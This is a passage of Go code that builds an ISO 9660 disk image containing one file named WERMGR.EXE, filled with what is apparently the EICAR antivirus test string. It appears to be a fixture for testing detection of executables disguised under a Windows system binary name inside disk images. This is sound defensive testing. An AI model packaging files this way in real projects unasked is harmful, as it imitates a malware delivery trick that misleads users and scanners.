	// Root directory record (34 bytes)
	rootDir := pvd[156:190]
	rootDir[0] = 34                    // length of this record
	putBothEndian32(rootDir[2:10], 20) // location of extent (sector 20)
	putBothEndian32(rootDir[10:18], sectorSz) // data length
	rootDir[25] = 0x02 // flags: directory

	// Volume Set Terminator at sector 17
	vst := iso[17*sectorSz:]
	vst[0] = 0xFF
	copy(vst[1:6], []byte("CD001"))
	vst[6] = 0x01

	// L-Path Table at sector 18
	lpt := iso[18*sectorSz:]
	lpt[0] = 1            // length of dir identifier
	putLE32(lpt[2:6], 20) // location of root dir
	lpt[6] = 1            // parent dir num
	lpt[7] = 0            // dir identifier (root)

	// M-Path Table at sector 19
	mpt := iso[19*sectorSz:]
	mpt[0] = 1
	putBE32(mpt[2:6], 20)
	mpt[6] = 0
	mpt[7] = 1

	// Root Directory at sector 20
	dir := iso[20*sectorSz:]
	// "." entry
	dir[0] = 34
	putBothEndian32(dir[2:10], 20)
	putBothEndian32(dir[10:18], sectorSz)
	dir[25] = 0x02
	dir[32] = 1
	dir[33] = 0x00
	// ".." entry
	dir2 := dir[34:]
	dir2[0] = 34
	putBothEndian32(dir2[2:10], 20)
	putBothEndian32(dir2[10:18], sectorSz)
	dir2[25] = 0x02
	dir2[32] = 1
	dir2[33] = 0x01
	// "wermgr.exe" file entry
	fileName := "WERMGR.EXE;1"
	fileEntry := dir[68:]
	fileEntry[0] = byte(33 + len(fileName))
	putBothEndian32(fileEntry[2:10], 21) // data at sector 21
	putBothEndian32(fileEntry[10:18], uint32(len(eicar)))
	fileEntry[25] = 0x00 // not a directory
	fileEntry[32] = byte(len(fileName))
	copy(fileEntry[33:], []byte(fileName))

	// File data at sector 21
	copy(iso[21*sectorSz:], eicar)

	return iso
}

func padRight(s string, n int) []byte {
	b := make([]byte, n)
	copy(b, []byte(s))
	for i := len(s); i < n; i++ {
		b[i] = ' '
	}
	return b
}

func putLE32(b []byte, v uint32) {
	b[0] = byte(v)
	b[1] = byte(v >> 8)
	b[2] = byte(v >> 16)
	b[3] = byte(v >> 24)
}

func putBE32(b []byte, v uint32) {
	b[0] = byte(v >> 24)
	b[1] = byte(v >> 16)
	b[2] = byte(v >> 8)
	b[3] = byte(v)
}

func putBothEndian32(b []byte, v uint32) {
	putLE32(b[:4], v)
	putBE32(b[4:8], v)
}

func putBothEndian16(b []byte, v uint16) {
	// Little-endian first, then big-endian (ISO 9660 "both-endian" field)
	b[0] = byte(v)
	b[1] = byte(v >> 8)
	b[2] = byte(v >> 8) // big-endian MSB
	b[3] = byte(v)      // big-endian LSB — was duplicating b[1] before
}
